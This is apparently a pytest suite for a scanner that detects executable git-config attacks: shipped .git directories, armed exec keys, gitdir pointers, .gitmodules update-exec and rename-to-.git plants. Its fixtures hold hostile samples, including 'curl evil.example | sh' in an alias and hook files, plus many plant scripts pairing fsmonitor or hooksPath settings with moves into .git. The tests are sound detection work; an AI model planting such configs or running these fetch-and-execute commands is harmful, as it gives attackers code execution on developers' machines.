"""Tests for scan_git_config.py - executable-git-config / shipped-.git detection.

Covers the Beltdown attack class: shipped .git directories (filesystem and
archive), armed exec keys in .git/config, gitdir pointer files, .gitmodules
update-exec, and the staged config-write + rename-to-.git plant. Negative
cases pin the false-positive bar: protective hardening values, plain aliases,
built-in credential helpers, normal .gitmodules, and either half of the
rename chain alone must all stay silent.
"""

import io
import os
import shutil
import subprocess
import tarfile
import textwrap
import zipfile

import pytest

import scan_archive
import scan_git_config as scanner


ARMED_CONFIG = textwrap.dedent("""\
    [core]
        repositoryformatversion = 0
        fsmonitor = .tools/fsmon.sh
        sshCommand = ssh -i /tmp/k
    [alias]
        st = status
        co = !sh -c "curl evil.example | sh"
    [credential]
        helper = cache --timeout=300
    [include]
        path = ../more.inc
""")

BENIGN_CONFIG = textwrap.dedent("""\
    [core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        fsmonitor = false
        hooksPath = /dev/null
    [remote "origin"]
        url = https://example.com/repo.git
    [alias]
        st = status
        lg = log --oneline
    [credential]
        helper = osxkeychain
""")


def _ids(findings):
    return {f.rule_id for f in findings}


def _crit(findings):
    return [f for f in findings if f.severity == "critical"]


def _make_nested_git(root, config=ARMED_CONFIG, hooks=("pre-commit",)):
    git_dir = root / "vendor" / "tool" / ".git"
    (git_dir / "hooks").mkdir(parents=True)
    (git_dir / "config").write_text(config)
    for name in hooks:
        (git_dir / "hooks" / name).write_text("#!/bin/sh\ncurl evil.example | sh\n")
    (git_dir / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\nexit 0\n")
    return git_dir


class TestConfigParser:
    def test_armed_keys_detected(self):
        entries = scanner.armed_config_entries(ARMED_CONFIG)
        keys = {e["key"] for e in entries}
        assert "core.fsmonitor" in keys
        assert "core.sshcommand" in keys
        assert "alias.co" in keys
        assert "include.path" in keys

    def test_benign_config_silent(self):
        assert scanner.armed_config_entries(BENIGN_CONFIG) == []

    def test_protective_hardening_values_inert(self):
        # The exact values sandbox-hardening guides tell users to set.
        config = ("[core]\n\tfsmonitor = false\n\thooksPath = /dev/null\n"
                  "\tfsmonitor = true\n")
        assert scanner.armed_config_entries(config) == []

    def test_shell_alias_only(self):
        # `alias.st = status` is not exec; only `!` aliases are.
        config = "[alias]\n\tst = status\n\tpwn = !id\n"
        entries = scanner.armed_config_entries(config)
        assert [e["key"] for e in entries] == ["alias.pwn"]

    def test_credential_helper_safe_list(self):
        for helper in ("cache", "store", "manager-core", "osxkeychain",
                       "cache --timeout=300", ""):
            config = f"[credential]\n\thelper = {helper}\n"
            assert scanner.armed_config_entries(config) == [], helper

    def test_credential_helper_exec(self):
        for helper in ("!sh -c id", "/tmp/helper", "custom-helper"):
            config = f"[credential]\n\thelper = {helper}\n"
            assert scanner.armed_config_entries(config), helper

    def test_hooks_path_nul_inert(self):
        assert scanner.armed_config_entries("[core]\n\thooksPath = NUL\n") == []

    def test_case_insensitive_keys_and_sections(self):
        entries = scanner.armed_config_entries("[CORE]\n\tFsMonitor = ./x.sh\n")
        assert [e["key"] for e in entries] == ["core.fsmonitor"]


class TestShippedGitFilesystem:
    def test_nested_git_dir_with_armed_config(self, tmp_path):
        _make_nested_git(tmp_path)
        findings = scanner.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-001" in ids
        assert "GC-SHIP-002" in ids
        assert "GC-SHIP-005" in ids
        armed = [f for f in findings if f.rule_id == "GC-SHIP-002"]
        assert all(f.severity == "critical" for f in armed)
        hook = [f for f in findings if f.rule_id == "GC-SHIP-005"]
        assert hook and "pre-commit" in hook[0].file
        assert all(".sample" not in f.file for f in hook)

    def test_nested_git_dir_benign_config_presence_only(self, tmp_path):
        _make_nested_git(tmp_path, config=BENIGN_CONFIG, hooks=())
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-001" in _ids(findings)
        assert "GC-SHIP-002" not in _ids(findings)
        assert "GC-SHIP-005" not in _ids(findings)

    def test_root_checkout_config_armed_is_high_not_critical(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text(ARMED_CONFIG)
        findings = scanner.scan_repo(str(tmp_path))
        root_hits = [f for f in findings if f.rule_id == "GC-ROOT-001"]
        assert root_hits
        assert all(f.severity == "high" for f in root_hits)
        assert "GC-SHIP-001" not in _ids(findings)

    def test_root_checkout_config_benign(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text(BENIGN_CONFIG)
        assert scanner.scan_repo(str(tmp_path)) == []

    def test_clean_repo_silent(self, tmp_path):
        (tmp_path / "app.py").write_text("print('hello')\n")
        (tmp_path / "README.md").write_text("# project\n")
        assert scanner.scan_repo(str(tmp_path)) == []


class TestGitdirPointers:
    def test_submodule_pointer_is_benign(self, tmp_path):
        (tmp_path / ".git" / "modules" / "sub").mkdir(parents=True)
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / ".git").write_text("gitdir: ../.git/modules/sub\n")
        assert scanner.scan_repo(str(tmp_path)) == []

    def test_pointer_escaping_tree_flagged(self, tmp_path):
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / ".git").write_text("gitdir: /outside/tree/.git\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-004" in _ids(findings)

    def test_pointer_to_shipped_dir_flagged_and_config_parsed(self, tmp_path):
        staged = tmp_path / "staged"
        staged.mkdir()
        (staged / "config").write_text(ARMED_CONFIG)
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / ".git").write_text("gitdir: ../staged\n")
        findings = scanner.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-004" in ids
        assert "GC-SHIP-002" in ids


class TestGitmodules:
    def test_update_exec_critical(self, tmp_path):
        (tmp_path / ".gitmodules").write_text(
            '[submodule "x"]\n\tpath = x\n\turl = ./x\n\tupdate = !./run.sh\n')
        findings = scanner.scan_repo(str(tmp_path))
        hits = [f for f in findings if f.rule_id == "GC-MOD-001"]
        assert len(hits) == 1
        assert hits[0].severity == "critical"
        assert hits[0].line == 4

    def test_normal_gitmodules_silent(self, tmp_path):
        (tmp_path / ".gitmodules").write_text(
            '[submodule "x"]\n\tpath = x\n\turl = https://example.com/x.git\n'
            '\tupdate = checkout\n')
        assert scanner.scan_repo(str(tmp_path)) == []


class TestStagedRenameChain:
    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_shell_mv_chain(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor .tools/fsmon.sh\nmv staging .git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_python_os_rename_chain(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "os.rename('staging', '.git')\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)

    def test_node_fs_rename_chain(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "fs.writeFileSync('.git/config', x);\n"
            "execSync('git config core.sshCommand ./s');\n"
            "fs.renameSync(dir, '.git');\n",
            name="plant.js")
        assert "GC-REN-001" in _ids(findings)

    def test_powershell_move_item_chain(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor .t/f.ps1\n"
            "Move-Item -Path .\\staging -Destination .git\n",
            name="plant.ps1")
        assert "GC-REN-001" in _ids(findings)

    def test_cmd_ren_chain(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor t\\f.cmd\nren staging .git\n",
            name="plant.bat")
        assert "GC-REN-001" in _ids(findings)

    def test_config_write_alone_silent(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor .tools/fsmon.sh\nmv staging prod\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_rename_alone_silent(self, tmp_path):
        findings = self._chain(tmp_path, "mv oldname .git\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_rename_to_github_not_git(self, tmp_path):
        # `.github` must not satisfy the rename arm (exact .git target only).
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv staging .github\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_rename_away_from_git_not_plant(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv .git .git.bak\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_split_across_sibling_files_is_high_not_critical(self, tmp_path):
        # PR #45 review (MED): the chain used to be same-file only. The two
        # arms in SIBLING files of one directory now correlate, at high - a
        # weaker link than one script doing both, which stays critical.
        (tmp_path / "a.sh").write_text("git config core.fsmonitor x.sh\n")
        (tmp_path / "b.sh").write_text("mv staging .git\n")
        findings = scanner.scan_repo(str(tmp_path))
        chain = [f for f in findings if f.rule_id == "GC-REN-001"]
        assert len(chain) == 1
        assert chain[0].severity == "high"

    def test_split_across_different_directories_silent(self, tmp_path):
        (tmp_path / "one").mkdir()
        (tmp_path / "two").mkdir()
        (tmp_path / "one" / "a.sh").write_text("git config core.fsmonitor x.sh\n")
        (tmp_path / "two" / "b.sh").write_text("mv staging .git\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-REN-001" not in _ids(findings)


class TestArchiveIntegration:
    def _zip(self, path, members):
        with zipfile.ZipFile(path, "w") as zf:
            for name, data in members.items():
                zf.writestr(name, data)

    def _tar(self, path, members):
        with tarfile.open(path, "w:gz") as tf:
            for name, data in members.items():
                body = data.encode()
                info = tarfile.TarInfo(name)
                info.size = len(body)
                tf.addfile(info, io.BytesIO(body))

    def test_beltdown2_zip_prearmed(self, tmp_path):
        # Beltdown2 delivery: a zip whose .git/config is already armed.
        self._zip(tmp_path / "workspace.zip", {
            "acme-widget/README.md": "# acme widget\n",
            "acme-widget/.git/config": ARMED_CONFIG,
            "acme-widget/.git/hooks/post-checkout": "#!/bin/sh\ncurl x | sh\n",
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-003" in ids
        assert "GC-SHIP-002" in ids
        assert "GC-SHIP-005" in ids
        shipped = [f for f in findings if f.rule_id == "GC-SHIP-003"]
        assert len(shipped) == 1  # one finding per .git root, not per member
        # PR #45 review (LOW): bare presence is HIGH (git-library test suites
        # ship fixture repos); the ARMED config and the non-sample hook in
        # this same archive are what make it critical.
        assert shipped[0].severity == "high"
        assert any(f.rule_id == "GC-SHIP-002" and f.severity == "critical"
                   for f in findings)
        assert any(f.rule_id == "GC-SHIP-005" and f.severity == "critical"
                   for f in findings)

    def test_beltdown2_tar_prearmed(self, tmp_path):
        self._tar(tmp_path / "bundle.tar.gz", {
            "proj/.git/config": ARMED_CONFIG,
            "proj/src/app.py": "print(1)\n",
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-003" in ids
        assert "GC-SHIP-002" in ids

    def test_archive_gitdir_pointer(self, tmp_path):
        self._zip(tmp_path / "w.zip", {
            "proj/src.py": "print(1)\n",
            "proj/.git": "gitdir: ../armed\n",
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        assert "GC-SHIP-004" in _ids(findings)

    def test_archive_gitmodules_update_exec(self, tmp_path):
        self._zip(tmp_path / "w.zip", {
            "proj/.gitmodules": '[submodule "x"]\n\tpath = x\n\tupdate = !./x.sh\n',
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        assert "GC-MOD-001" in _ids(findings)

    def test_archive_rename_chain_member(self, tmp_path):
        self._zip(tmp_path / "w.zip", {
            "plant.sh": "git config core.hooksPath .h\nmv stage .git\n",
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        assert "GC-REN-001" in _ids(findings)

    def test_archive_benign_config_no_armed_finding(self, tmp_path):
        # A .git directory in an archive is still hostile on presence, but a
        # benign config must not produce armed-key findings.
        self._zip(tmp_path / "w.zip", {
            "proj/.git/config": BENIGN_CONFIG,
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        assert "GC-SHIP-003" in _ids(findings)
        assert "GC-SHIP-002" not in _ids(findings)

    def test_archive_without_git_content_clean(self, tmp_path):
        self._zip(tmp_path / "ok.zip", {
            "pkg/__init__.py": "VERSION = '1.0'\n",
            "pkg/util.py": "def add(a, b):\n    return a + b\n",
        })
        findings = scan_archive.scan_repo(str(tmp_path))
        assert not [f for f in findings
                    if f.rule_id.startswith("GC-")
                    and f.severity in ("critical", "high")]

    def test_git_member_path_classification(self):
        cls = scanner.classify_git_member_path
        assert cls("p/.git/config") == ("config", "p/.git")
        assert cls("p/.git/hooks/pre-commit") == ("hooks", "p/.git")
        assert cls("p/.git/") == ("dir", "p/.git")
        assert cls("p/.git") == ("gitdir_file", "p/.git")
        assert cls(".git/config") == ("config", ".git")
        assert cls("p/src/app.py") is None
        assert cls("p/.github/workflows/ci.yml") is None
        # Windows-style separators in a member name
        assert cls("p\\.git\\config") == ("config", "p/.git")


class TestEvidenceClass:
    def test_findings_pinned_direct(self, tmp_path):
        # .git/config has no extension; without an explicit pin the report
        # layer would demote these to inferred/LOW.
        _make_nested_git(tmp_path)
        findings = scanner.scan_repo(str(tmp_path))
        assert findings
        assert all(f.evidence_class == "direct" for f in findings)


# ---------------------------------------------------------------------------
# Round-2 adversarial regressions
# ---------------------------------------------------------------------------

class TestRenameTargetExactness:
    """A1#1: arm 2 must require basename exactly `.git` - git/git's own docs
    and tests relocate `proj.git` directories and must stay silent."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_mv_repo_git_relocation_silent(self, tmp_path):
        # Documentation/user-manual.adoc in git/git: moving proj.git around.
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "mv proj.git /home/you/public_html/proj.git\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_mv_dollar_suffix_git_silent(self, tmp_path):
        # git/git test-lib style: renaming a repo to "$1.git".
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\nmv \"$1\" \"$1.git\"\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_mv_to_dotgit_subdir_fires(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv stage ./sub/.git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_mv_to_dot_slash_git_fires(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv stage ./.git\n")
        assert "GC-REN-001" in _ids(findings)


class TestRenameEvasions:
    """A1#2 / H1 / M3 / M4: quoting, one-hop variables, trailing flags, and
    copy-plants must all satisfy arm 2."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_double_quoted_target(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv stage \".git\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_shell_variable_target_same_line(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\ntarget=.git; mv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_shell_variable_target_across_lines(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.hooksPath .h\ntarget='.git'\nmv stage ${target}\n")
        assert "GC-REN-001" in _ids(findings)

    def test_python_variable_target(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "target='.git'\nos.rename(stage, target)\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)

    def test_node_const_target(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "execSync('git config core.sshCommand ./s');\n"
            "const t = '.git';\nfs.renameSync(a, t);\n",
            name="plant.js")
        assert "GC-REN-001" in _ids(findings)

    def test_powershell_variable_target(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor .t\\f.ps1\n"
            "$target = \".git\"\nMove-Item staging $target\n",
            name="plant.ps1")
        assert "GC-REN-001" in _ids(findings)

    def test_cmd_set_variable_target(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor t\\f.cmd\n"
            "set target=.git\nren stage %target%\n",
            name="plant.bat")
        assert "GC-REN-001" in _ids(findings)

    def test_cmd_set_quoted_assignment(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor t\\f.cmd\n"
            "set \"target=.git\"\nren stage %target%\n",
            name="plant.bat")
        assert "GC-REN-001" in _ids(findings)

    def test_trailing_powershell_flags(self, tmp_path):
        # M3: flags after the target must not hide it.
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor .t\\f.ps1\n"
            "Move-Item staging .git -Force\n",
            name="plant.ps1")
        assert "GC-REN-001" in _ids(findings)

    def test_mv_with_flags_before_operands(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv -f stage .git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_variable_bound_to_other_value_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\ntarget=prod; mv stage \"$target\"\n")
        assert "GC-REN-001" not in _ids(findings)


class TestCopyPlants:
    """M4: cp/Copy-Item/xcopy/robocopy planting `.git` satisfy arm 2."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_cp_recursive_plant(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\ncp -r staging .git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_copy_item_plant(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor .t\\f.ps1\n"
            "Copy-Item -Path staging -Destination .git -Recurse\n",
            name="plant.ps1")
        assert "GC-REN-001" in _ids(findings)

    def test_xcopy_plant(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor t\\f.cmd\nxcopy staging .git /E /I\n",
            name="plant.bat")
        assert "GC-REN-001" in _ids(findings)

    def test_robocopy_plant(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor t\\f.cmd\nrobocopy staging .git /MIR\n",
            name="plant.bat")
        assert "GC-REN-001" in _ids(findings)

    def test_copy_away_from_git_silent(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\ncp -r .git backup\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_robocopy_backup_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor t\\f.cmd\nrobocopy .git backup /MIR\n",
            name="plant.bat")
        assert "GC-REN-001" not in _ids(findings)

    def test_shutil_copytree_plant(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import shutil\nos.system('git config core.hooksPath .h')\n"
            "shutil.copytree('staging', '.git')\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)


class TestIgnoredRootSweep:
    """A1#3: ignored dependency roots are swept for .git metadata only."""

    def test_node_modules_git_dir_found(self, tmp_path):
        git_dir = tmp_path / "node_modules" / "evil-pkg" / ".git"
        (git_dir / "hooks").mkdir(parents=True)
        (git_dir / "config").write_text(ARMED_CONFIG)
        (git_dir / "hooks" / "post-checkout").write_text("#!/bin/sh\nid\n")
        (tmp_path / "app.js").write_text("console.log(1)\n")
        findings = scanner.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-001" in ids
        assert "GC-SHIP-002" in ids
        assert "GC-SHIP-005" in ids

    def test_node_modules_pointer_file_found(self, tmp_path):
        sub = tmp_path / "node_modules" / "pkg" / "sub"
        sub.mkdir(parents=True)
        (sub / ".git").write_text("gitdir: /outside/tree/.git\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-004" in _ids(findings)

    def test_ignored_root_ordinary_content_stays_ignored(self, tmp_path):
        # The sweep is .git-metadata-only: a plant script inside node_modules
        # is ordinary content and walk_repo still skips the ignored root.
        pkg = tmp_path / "node_modules" / "pkg"
        pkg.mkdir(parents=True)
        (pkg / "setup.sh").write_text(
            "git config core.fsmonitor x.sh\nmv stage .git\n")
        (pkg / ".gitmodules").write_text(
            '[submodule "x"]\n\tpath = x\n\tupdate = !./x.sh\n')
        findings = scanner.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-REN-001" not in ids
        assert "GC-MOD-001" not in ids

    def test_deeply_nested_ignored_root(self, tmp_path):
        git_dir = (tmp_path / "node_modules" / "a" / "node_modules" / "b"
                   / ".git")
        git_dir.mkdir(parents=True)
        (git_dir / "config").write_text(ARMED_CONFIG)
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-001" in _ids(findings)
        assert "GC-SHIP-002" in _ids(findings)


class TestGitdirEvasions:
    """A1#4 / L3: root pointers, worktree proof, symlinked targets."""

    def test_root_pointer_escaping_tree_flagged(self, tmp_path):
        (tmp_path / ".git").write_text("gitdir: /tmp/evil\n")
        findings = scanner.scan_repo(str(tmp_path))
        hits = [f for f in findings if f.rule_id == "GC-SHIP-004"]
        assert hits and hits[0].file == ".git"

    def test_root_pointer_multiline_content_flagged(self, tmp_path):
        # L3: trailing content after the gitdir line must not hide it.
        (tmp_path / ".git").write_text(
            "gitdir: /tmp/evil\n# trailing\nmore lines\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-004" in _ids(findings)

    def test_root_pointer_to_shipped_dir_flagged(self, tmp_path):
        staged = tmp_path / "staged"
        staged.mkdir()
        (staged / "config").write_text(ARMED_CONFIG)
        (tmp_path / ".git").write_text("gitdir: staged\n")
        findings = scanner.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-004" in ids
        assert "GC-SHIP-002" in ids

    def test_root_worktree_pointer_verified_silent(self, tmp_path):
        # Real worktree machinery: the target holds commondir plus a gitdir
        # back-pointer resolving to the scanned root's own .git file.
        main_meta = tmp_path / "main" / ".git" / "worktrees" / "wt"
        main_meta.mkdir(parents=True)
        (tmp_path / "main" / ".git" / "HEAD").write_text(
            "ref: refs/heads/main\n")
        (main_meta / "commondir").write_text("../..\n")
        wt = tmp_path / "wt"
        wt.mkdir()
        pointer = wt / ".git"
        pointer.write_text(f"gitdir: {main_meta}\n")
        (main_meta / "gitdir").write_text(f"{pointer}\n")
        assert scanner.scan_repo(str(wt)) == []

    def test_root_pointer_without_proof_flagged(self, tmp_path):
        # A target directory that exists but carries no commondir/back-link
        # is not worktree machinery.
        target = tmp_path / "elsewhere"
        target.mkdir()
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / ".git").write_text(f"gitdir: ../elsewhere\n")
        findings = scanner.scan_repo(str(wt))
        assert "GC-SHIP-004" in _ids(findings)

    def test_symlinked_nested_git_dir_inspected(self, tmp_path):
        real = tmp_path / "hidden_real"
        (real / "hooks").mkdir(parents=True)
        (real / "config").write_text(ARMED_CONFIG)
        (real / "hooks" / "pre-commit").write_text("#!/bin/sh\nid\n")
        (tmp_path / "vendor").mkdir()
        os.symlink(str(real), str(tmp_path / "vendor" / ".git"))
        findings = scanner.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-001" in ids
        assert "GC-SHIP-002" in ids
        assert "GC-SHIP-005" in ids

    def test_symlinked_nested_pointer_file_read(self, tmp_path):
        sub = tmp_path / "sub"
        sub.mkdir()
        real_ptr = sub / "realptr"
        real_ptr.write_text("gitdir: /outside/tree/.git\n")
        os.symlink(str(real_ptr), str(sub / ".git"))
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-004" in _ids(findings)


class TestHookRecognition:
    """A1#5 / L2: case-insensitive .sample exclusion, recognised hook names
    only, and a filesystem finding cap matching the archive path."""

    def test_uppercase_sample_suffix_silent(self, tmp_path):
        git_dir = tmp_path / "vendor" / ".git"
        (git_dir / "hooks").mkdir(parents=True)
        (git_dir / "config").write_text(BENIGN_CONFIG)
        (git_dir / "hooks" / "pre-commit.SAMPLE").write_text("#!/bin/sh\nid\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-005" not in _ids(findings)
        assert "GC-SHIP-001" in _ids(findings)  # presence still reported

    def test_arbitrary_file_in_hooks_silent(self, tmp_path):
        git_dir = tmp_path / "vendor" / ".git"
        (git_dir / "hooks").mkdir(parents=True)
        (git_dir / "config").write_text(BENIGN_CONFIG)
        (git_dir / "hooks" / "README").write_text("notes about hooks\n")
        (git_dir / "hooks" / "hooks.txt").write_text("not a hook\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert "GC-SHIP-005" not in _ids(findings)
        assert "GC-SHIP-001" in _ids(findings)

    def test_hook_findings_capped(self, tmp_path):
        git_dir = tmp_path / "vendor" / ".git"
        (git_dir / "hooks").mkdir(parents=True)
        (git_dir / "config").write_text(BENIGN_CONFIG)
        for name in ("pre-commit", "post-commit", "pre-push", "post-merge",
                     "commit-msg", "post-checkout", "pre-rebase"):
            (git_dir / "hooks" / name).write_text("#!/bin/sh\nid\n")
        findings = scanner.scan_repo(str(tmp_path))
        hooks = [f for f in findings if f.rule_id == "GC-SHIP-005"]
        assert len(hooks) == scanner._MAX_HOOK_FINDINGS == 5

    def test_archive_sample_and_readme_not_hooks(self, tmp_path):
        with zipfile.ZipFile(tmp_path / "w.zip", "w") as zf:
            zf.writestr("p/.git/config", BENIGN_CONFIG)
            zf.writestr("p/.git/hooks/pre-commit.SAMPLE", "#!/bin/sh\n")
            zf.writestr("p/.git/hooks/README", "notes\n")
        findings = scan_archive.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-003" in ids       # the .git root still surfaces
        assert "GC-SHIP-005" not in ids

    def test_hook_name_classification(self):
        cls = scanner.classify_git_member_path
        assert cls("p/.git/hooks/pre-commit.SAMPLE") == ("other", "p/.git")
        assert cls("p/.git/hooks/README") == ("other", "p/.git")
        assert cls("p/.git/hooks/post-checkout") == ("hooks", "p/.git")
        assert cls("p/.git/hooks/fsmonitor-watchman") == ("hooks", "p/.git")


class TestExecKeySet:
    """M5 / L5: checkout-time exec keys (filter/gpg/diff/askpass) and the
    root-rule pager/editor path-like restriction."""

    def test_checkout_exec_keys_armed_in_shipped_config(self):
        config = textwrap.dedent("""\
            [filter "x"]
                clean = ./clean.sh
                smudge = ./smudge.sh
                process = ./process.sh
            [gpg]
                program = /tmp/evil-gpg
            [diff]
                external = ./diff.sh
            [core]
                askpass = /tmp/askpass.sh
        """)
        keys = {e["key"] for e in scanner.armed_config_entries(config)}
        assert {"filter.clean", "filter.smudge", "filter.process",
                "gpg.program", "diff.external", "core.askpass"} <= keys

    def test_exec_key_inert_carveouts(self):
        config = textwrap.dedent("""\
            [filter "lfs"]
                clean = git-lfs clean -- %f
                smudge = git-lfs smudge -- %f
                process = git-lfs filter-process
            [gpg]
                program = gpg2
        """)
        assert scanner.armed_config_entries(config) == []

    def test_shipped_config_bare_editor_still_critical(self, tmp_path):
        # A shipped .git is hostile by construction: even `editor = vim`
        # counts there (no developer context to be lenient about).
        git_dir = tmp_path / "vendor" / ".git"
        git_dir.mkdir(parents=True)
        (git_dir / "config").write_text("[core]\n\teditor = vim\n")
        findings = scanner.scan_repo(str(tmp_path))
        hits = [f for f in findings if f.rule_id == "GC-SHIP-002"]
        assert hits and all(f.severity == "critical" for f in hits)

    def test_root_editor_bare_program_silent(self, tmp_path):
        # L5: a developer's own checkout may set editor/pager to PATH names.
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text(
            "[core]\n\teditor = vim\n\tpager = less --raw-control-chars\n")
        assert scanner.scan_repo(str(tmp_path)) == []

    def test_root_editor_path_like_flagged(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("[core]\n\teditor = ./tools/e\n")
        hits = [f for f in scanner.scan_repo(str(tmp_path))
                if f.rule_id == "GC-ROOT-001"]
        assert hits and hits[0].severity == "high"

    def test_armed_config_findings_capped(self, tmp_path):
        body = "[include]\n" + "".join(
            f"\tpath = /p/{i}.inc\n" for i in range(40))
        git_dir = tmp_path / "vendor" / ".git"
        git_dir.mkdir(parents=True)
        (git_dir / "config").write_text(body)
        findings = scanner.scan_repo(str(tmp_path))
        armed = [f for f in findings if f.rule_id == "GC-SHIP-002"]
        assert len(armed) == scanner._MAX_ARMED_CONFIG_FINDINGS == 25


class TestArchiveDirEntryClassification:
    """L4: a bare `.git` DIRECTORY entry (no trailing slash, DOS dir bit) is
    shipped metadata (critical), not a gitdir pointer file (high)."""

    def test_classify_bare_dir_entry_with_is_dir(self):
        cls = scanner.classify_git_member_path
        assert cls("p/.git", is_dir=True) == ("dir", "p/.git")
        assert cls("p/.git", is_dir=False) == ("gitdir_file", "p/.git")

    def test_zip_bare_git_dir_entry_critical(self, tmp_path):
        with zipfile.ZipFile(tmp_path / "w.zip", "w") as zf:
            info = zipfile.ZipInfo("p/.git")  # no trailing slash
            info.external_attr = 0x10         # DOS directory attribute
            zf.writestr(info, b"")
            zf.writestr("p/src.py", "print(1)\n")
        findings = scan_archive.scan_repo(str(tmp_path))
        ids = _ids(findings)
        assert "GC-SHIP-003" in ids
        assert "GC-SHIP-004" not in ids

    def test_tar_git_dir_member_critical(self, tmp_path):
        with tarfile.open(tmp_path / "w.tar.gz", "w:gz") as tf:
            info = tarfile.TarInfo("p/.git")
            info.type = tarfile.DIRTYPE
            tf.addfile(info)
            body = b"print(1)\n"
            f = tarfile.TarInfo("p/src.py")
            f.size = len(body)
            tf.addfile(f, io.BytesIO(body))
        findings = scan_archive.scan_repo(str(tmp_path))
        assert "GC-SHIP-003" in _ids(findings)


class TestGeneratorRegistration:
    def test_gen_rule_ids_knows_git_config(self):
        # L6: a future rule_ids.csv regen must not silently drop the GC rows.
